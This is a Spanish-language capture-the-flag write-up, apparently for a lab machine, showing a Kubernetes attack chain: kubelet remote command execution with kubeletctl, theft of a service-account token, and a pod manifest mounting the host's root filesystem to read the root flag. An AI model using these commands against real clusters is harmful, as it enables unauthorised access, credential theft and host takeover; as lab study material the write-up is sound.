## Reconocimiento

### Escaneo de puertos abiertos

Se identificaron los siguientes puertos abiertos:

```
22, 2379, 2380, 8443, 10249, 10250, 10256
```

El análisis de estos puertos reveló que el servicio en ejecución está relacionado con Kubernetes:

- **Puerto 8443**: API de Kubernetes ([[kubectl]])
    
- **Puertos 2379 y 2380**: Cluster de [[etcd]] para Kubernetes
    
- **Puertos 10249 y 10250**: Relacionados con [[InfluxDB]] y [[kubelet]]
    
- **Puerto 10250**: Permite interacción con kubelet a través de [[kubeletctl]]

## Explotación del Puerto 10250 (Kubelet)

### Enumeración con kubeletctl

- Se listaron los pods disponibles en el sistema:

```
kubeletctl -s <IP> get pods
```

![[Pasted image 20250317131052.png]]

- Se identificó que el único pod en el _namespace_ por defecto es `nginx`.
	![[Pasted image 20250317132329.png]]
- Se verificó que el pod permite ejecución remota (_RCE_), observando el símbolo `+` en la columna correspondiente.

### Ejecución de comandos

Dado que la salida de los comandos se recibe en nuestra terminal, se comprobó que lanzar una shell es suficiente:

```
kubeletctl -s <IP> exec -p nginx -c nginx "bash"
```

## Escalada de Privilegios

### Extracción del ServiceAccount y Token

Dentro del directorio `/run/secrets/kubernetes.io/serviceaccount` se encontraron los siguientes archivos relevantes:

![[Pasted image 20250317134653.png]]

```
ca.crt
token
namespace
```

Utilizando este token, se pudo acceder a la API de Kubernetes mediante `kubectl`:

```
kubectl --server=https://<IP>:8443 --certificate-authority=ca.crt --token=<TOKEN> get pods
```


Se verificó que los permisos estaban limitados principalmente al pod `nginx`.

### Enumeración de permisos

Ejecutando:

```
kubectl auth can-i --list
```

Se encontró que era posible **crear pods**, lo que permitía la ejecución de contenedores personalizados.

## Creación de un nuevo Pod malicioso

Se creó un nuevo pod con acceso a la raíz del host:

```
apiVersion: v1
kind: Pod
metadata:
  name: dz4-pod
  namespace: default
spec:
  containers:
  - name: dz4-pod
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
```

Se desplegó el pod con:

```
kubectl apply -f pod.yaml --server=https://<IP>:8443 --certificate-authority=ca.crt --token=<TOKEN>
```

Al listar los pods, se verificó que el nuevo pod estaba en ejecución:

```
kubectl get pods
```

Se accedió a la shell del contenedor:

```
kubeletctl -s <IP> -p dz4-pod -c dz4-pod exec "bash"
```

Desde este contenedor, se accedió al sistema host a través de `/mnt/`, lo que permitió explorar el sistema de archivos del servidor.
## Obtención de la Flag

Se accedió a `/root/` y se encontró la flag de root.

```
cd /mnt/root/
cat root.txt
```

**FIN**